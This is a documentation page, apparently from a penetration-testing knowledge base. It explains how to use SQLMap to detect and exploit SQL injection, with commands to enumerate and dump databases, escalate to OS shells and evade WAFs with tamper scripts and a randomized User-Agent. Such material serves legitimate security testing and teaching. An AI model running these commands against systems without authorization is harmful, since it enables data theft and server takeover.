@@ -1,0 +1,159 @@
+---
+title: SQLMap
+description: The automated SQL injection tool - what it detects (the BEUSTQ technique set), how to point it at a target (Copy-as-cURL, request files, the injection marker, JSON/XML bodies), the workflow from detection to RCE, and how to read its log output so you know what it actually proved.
+mitre: [T1190]
+d3fend: [D3-MH, D3-NTA]
+impact: [DataExfil, AuthBypass, RCE]
+owasp: [A05]
+sidebar:
+  order: 1
+  label: Overview
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+SQLMap automates detection and exploitation of SQL injection across ~35 DBMSes and all six injection classes. Point it at a request, let it fingerprint and confirm, then drive it through enumeration and (where privileges allow) file read/write and OS command execution.
+
+```
+# Minimal - a GET parameter
+sqlmap -u 'http://target/vuln.php?id=1' --batch
+
+# The usual starting point - a saved Burp request
+sqlmap -r req.txt --batch
+
+# Confirmed-and-escalate, in order
+sqlmap -r req.txt --batch --dbs                 # list databases
+sqlmap -r req.txt --batch -D prod -T users --dump   # exfiltrate
+sqlmap -r req.txt --batch --is-dba --os-shell   # post-exploit
+```
+
+Success indicator: SQLMap prints `sqlmap identified the following injection point(s)` with a type/title/payload block - that block is the proof the parameter is exploitable, and the payloads are reusable for a manual report.
+
+This page is the map of the SQLMap sub-cluster. For the exhaustive flag list see [Cheatsheet](/codex/web/sqli/sqlmap/cheatsheet/); when a run misbehaves see [Troubleshooting](/codex/web/sqli/sqlmap/troubleshooting/).
+
+## When to reach for SQLMap
+
+Manual exploitation is faster for a single value and essential for understanding the bug - but SQLMap wins when the work is repetitive or blind:
+
+- A large schema to enumerate quickly.
+- Blind SQLi with hundreds of characters to extract bit-by-bit.
+- Awkward request handling (cookies, custom headers, JSON/XML/multipart bodies, CSRF tokens).
+- Post-exploitation primitives (file read/write, `--os-shell`) you'd otherwise hand-build per DBMS.
+
+The manual techniques behind each of SQLMap's classes live in the rest of the [SQL injection cluster](/codex/web/sqli/) - read those to understand *what* SQLMap is doing on the wire.
+
+## The injection classes SQLMap uses (BEUSTQ)
+
+`sqlmap -hh` lists `--technique=BEUSTQ` (the default, all six). Each letter is one class, and each maps to a manual page in this cluster:
+
+| Flag | Class | How it extracts | Speed | Manual page |
+| --- | --- | --- | --- | --- |
+| `B` | Boolean-based blind | TRUE/FALSE inferred from response differences, 1 bit/request | Slow | [Boolean blind](/codex/web/sqli/blind-boolean/) |
+| `E` | Error-based | Data smuggled into reflected DBMS error text, ~200 B/request | Fast | [UNION: error-based extraction](/codex/web/sqli/union-based/#error-based-extraction) |
+| `U` | UNION query | Injected `SELECT` appended to the original result set | Fastest | [UNION-based](/codex/web/sqli/union-based/) |
+| `S` | Stacked queries | `; <stmt>` - runs non-`SELECT` (needed for some RCE paths) | n/a | [Detection](/codex/web/sqli/detection/) |
+| `T` | Time-based blind | TRUE/FALSE inferred from `SLEEP`-anchored response delay | Slowest | [Time-based blind](/codex/web/sqli/blind-time/) |
+| `Q` | Inline query | Sub-query embedded in the original query | n/a | [Detection](/codex/web/sqli/detection/) |
+
+Plus **out-of-band** via DNS exfiltration (`--dns-domain`, you control the domain's DNS). This is an *extraction channel for an injection SQLMap has already confirmed* - not a way to detect a silent injection after the other techniques fail detection - and it needs the DB host to be able to resolve external DNS. Reach for it to speed up extraction once a point is found but in-band/inferential retrieval is slow or blocked. The manual out-of-band *detection* technique is a separate thing - see [Out-of-band](/codex/web/sqli/out-of-band/).
+
+Narrow the set when a class is causing trouble (e.g. time-based timeouts): `--technique=BEU` skips stacked, time, and inline.
+
+<Aside type="note">
+`S` (stacked) is required for takeover methods that need a *second* statement - e.g. MSSQL's stacked `xp_cmdshell`. It is **not** a blanket requirement for `--os-shell`: on MySQL a `U`-only injection can still drop a web backdoor via `INTO OUTFILE` given the `FILE` privilege and a writable, PHP-serving web directory, and `--sql-shell` read queries run over `B`/`E`/`U` too. So a `B`/`U`-only target isn't out of reach - it just constrains *which* takeover path works. If `--os-shell` fails, check `--is-dba` / `FILE` privilege and the writable-webroot requirements ([File operations](/codex/web/sqli/file-operations/)) before blaming the missing stacked technique.
+</Aside>
+
+## Pointing SQLMap at a target
+
+The single most common cause of a "not injectable" result is a mis-specified request, not a patched target. Get the request right first.
+
+### Copy as cURL
+
+The reliable way to reproduce exactly what the browser sends: in Chrome/Edge/Firefox DevTools → Network panel, right-click the request → **Copy → Copy as cURL**. Paste it on the command line and change `curl` to `sqlmap`:
+
+```shell
+sqlmap 'http://target/?id=1' \
+  -H 'User-Agent: Mozilla/5.0 ...' -H 'Accept: ...' --compressed
+```
+
+Every header, cookie, and body the app expects comes along for free.
+
+### The three ways to supply parameters
+
+```shell
+sqlmap -u 'http://target/vuln.php?id=1'          # GET params inline
+sqlmap 'http://target/' --data 'uid=1&name=test' # POST body (-p uid to narrow)
+sqlmap -r req.txt                                 # full Burp-saved request
+```
+
+- `-r req.txt` is the default choice for anything non-trivial - it carries the method, headers, cookies, and body verbatim.
+- Restrict testing to one parameter with `-p uid`, or mark the exact spot with a `*` injection marker: `--data 'uid=1*&name=test'` or `/?id=*` inside a request file.
+- Test a non-standard spot (a header, a cookie) by putting the marker there: `--cookie='id=1*'`.
+
+### Bodies and methods
+
+SQLMap parses form-encoded, **JSON** (`{"id":1}`), and **XML** (`<id>1</id>`) bodies - mark the value with `*` or let it auto-detect. Set `Content-Type` to match (`-H 'Content-Type: application/json'`), and override the verb with `--method PUT` when needed.
+
+### The flag that prevents most blocks
+
+```shell
+--random-agent      # swap SQLMap's giveaway default User-Agent for a real browser one
+```
+
+Protection solutions routinely drop traffic carrying `User-Agent: sqlmap/1.x`. Reach for `--random-agent` the moment a run returns 5xx from the start. The full target-spec flag list is in the [Cheatsheet](/codex/web/sqli/sqlmap/cheatsheet/#target-specification).
+
+## The workflow
+
+```
+1. Detect     sqlmap -r req.txt --batch
+                 → "sqlmap identified the following injection point(s)"
+2. Recon      --banner --current-user --current-db --is-dba
+3. Enumerate  --dbs → --tables -D <db> → --dump -T <table> -D <db>
+4. Escalate   --is-dba → --file-read / --file-write / --os-shell
+```
+
+`--batch` auto-accepts every prompt with its default - the right choice for unattended runs. SQLMap caches detection per-target under `~/.sqlmap/output/<host>/` (newer Linux: `~/.local/share/sqlmap/output/`), so step 2 onward skips re-detection and resumes from the session file. Full enumeration detail: [Enumeration](/codex/web/sqli/enumeration/); post-exploitation: [File operations](/codex/web/sqli/file-operations/).
+
+### Tuning the detection (when the defaults miss)
+
+SQLMap defaults to the ~72 highest-yield payloads. Two dials widen the net:
+
+- `--level=1..5` (default 1) adds more boundaries *and* places to inject (headers, cookies). Level 5 tries the full ~7,800-payload matrix.
+- `--risk=1..3` (default 1) adds riskier vectors - notably `OR`-based payloads, which can modify data on `UPDATE`/`DELETE` statements, so they're off by default. Raise `--risk` for login forms where `OR` is often the only thing that works.
+
+When you know the exact context, skip the guessing and force the boundary with `--prefix`/`--suffix` (e.g. `--prefix="')" --suffix="-- -"`), and force the engine with `--dbms=MySQL` to skip other-DBMS payloads. See the full detection flag set in the [Cheatsheet](/codex/web/sqli/sqlmap/cheatsheet/#detection).
+
+## Reading SQLMap's output
+
+The scrolling log is a running commentary on what SQLMap proved. The messages worth recognizing:
+
+| Log message | What it means for you |
+| --- | --- |
+| `target URL content is stable` | Responses to identical requests don't drift - clean baseline, differential detection will be reliable. |
+| `GET parameter 'id' appears to be dynamic` | Changing the value changes the response - the parameter likely reaches a query. "Not dynamic" is a red flag the param isn't processed (wrong name, stripped by a redirect). |
+| `heuristic (basic) test shows that ... might be injectable (possible DBMS: 'MySQL')` | An intentionally broken value triggered a DBMS error. An *indication*, not proof - and a free DBMS fingerprint. |
+| `might be vulnerable to cross-site scripting (XSS)` | A bonus heuristic - SQLMap noticed a reflected value. Not its job, but note it. |
+| `it looks like the back-end DBMS is 'MySQL'. ... skip test payloads specific for other DBMSes?` | Say yes (or `--batch`) to cut testing time once the DBMS is clear; `--dbms=MySQL` sets it upfront. |
+| `reflective value(s) found and filtering out` | Your payload is echoed in the response; SQLMap strips that noise before comparing. Harmless. |
+| `parameter 'id' appears to be '...injectable' (with --string="luther")` | Likely a hit - and SQLMap found a constant string that cleanly separates TRUE from FALSE, so it's not relying on fuzzy comparison. Strong signal. |
+| `time-based comparison requires a larger statistical model, please wait...` | Gathering baseline response times so it can tell a real `SLEEP` delay from network jitter. Let it finish. |
+| `'ORDER BY' technique appears to be usable` | A fast path to the UNION column count via binary search - good news for UNION extraction. |
+| `GET parameter 'id' is vulnerable. Do you want to keep testing the others?` | Confirmed exploitable. Say no to stop at the first point, yes to map every injectable parameter for a report. |
+| `sqlmap identified the following injection point(s) ...` | **The proof.** Lists every confirmed point with type, title, and payload - reusable for manual verification and the report. |
+| `fetched data logged to text files under '...'` | Where the session, logs, and dumps live. Include this directory in deliverables. |
+
+When a run *doesn't* behave - no injection found, enumeration hangs, errors suppressed - every diagnostic move (`--parse-errors`, `-t`, `-v 6`, `--proxy`, `--flush-session`) is in [Troubleshooting](/codex/web/sqli/sqlmap/troubleshooting/).
+
+## Bypassing protections
+
+When a WAF/IPS sits in front, SQLMap has the tooling to get payloads through: `--tamper=<script>[,...]` rewrites payloads (the `between` and `space2comment` scripts are the usual first try), `--chunked` and `--hpp` split keywords across the wire, and `--csrf-token`/`--randomize`/`--eval` satisfy anti-automation parameters. The full tamper catalog and bypass flags are in the [Cheatsheet](/codex/web/sqli/sqlmap/cheatsheet/#waf--ips-bypass); the manual filter/WAF-evasion concepts are in [Filter & WAF bypasses](/codex/web/sqli/bypasses/).
+
+## Next move
+
+- **Have a Burp request, want a first pass** → `sqlmap -r req.txt --batch`, then read the log per the table above
+- **Confirmed injection, need the data** → [Cheatsheet: enumeration](/codex/web/sqli/sqlmap/cheatsheet/#enumeration) and [Enumeration](/codex/web/sqli/enumeration/)
+- **DBA and want files or a shell** → [File operations](/codex/web/sqli/file-operations/) for the per-DBMS privilege requirements; `--file-read` / `--os-shell` flags in the [Cheatsheet](/codex/web/sqli/sqlmap/cheatsheet/#os-command-execution)
+- **Getting blocked or filtered** → [Filter & WAF bypasses](/codex/web/sqli/bypasses/) and `--tamper` / `--random-agent`
+- **Run isn't behaving** → [Troubleshooting](/codex/web/sqli/sqlmap/troubleshooting/)
+- **Every flag in one place** → [Cheatsheet](/codex/web/sqli/sqlmap/cheatsheet/)
